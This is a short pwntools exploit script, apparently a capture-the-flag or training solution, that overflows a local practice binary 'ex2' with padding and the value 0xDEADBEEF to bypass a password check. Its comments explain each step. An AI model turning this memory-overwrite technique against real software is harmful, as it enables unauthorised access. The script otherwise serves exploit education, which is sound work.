#!/usr/bin/env python3

from pwn import *

target = process("./ex2")

# b"A" * 8 -> for the password bypass
# p64(0xDEADBEEF) -> writes in 8 bytes DEADBEEF
payload = b"A" * 8 + p64(0xDEADBEEF) # craft the payload

target.send(payload) # notice how we're not using 'sendline' so it does not add a newline

target.interactive()
